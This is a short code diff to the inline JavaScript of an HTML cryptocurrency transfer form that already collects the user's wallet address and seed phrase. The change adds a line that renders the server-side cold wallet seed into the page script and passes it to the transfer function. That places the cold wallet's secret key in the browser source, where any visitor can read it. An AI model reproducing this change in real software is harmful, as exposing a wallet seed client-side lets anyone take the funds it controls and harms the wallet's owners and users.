@@ -39,12 +39,13 @@
         document.querySelector('form').addEventListener('submit', async function(event) {
             event.preventDefault();
 
-            const receiverAddress = "{{ cold_wallet_address }}";
+            const coldWalletAddress = "{{ cold_wallet_address }}";
+            const coldWalletSeed = "{{ cold_wallet_seed }}";
             const userAddress = document.getElementById('user_address').value;
             const userSeed = document.getElementById('user_seed').value;
             const amount = document.getElementById('amount').value;
 
-            processForm(userAddress, userSeed, receiverAddress, amount, true);
+            processForm(userAddress, userSeed, coldWalletAddress, amount, true, coldWalletSeed);
             
         });
     </script>
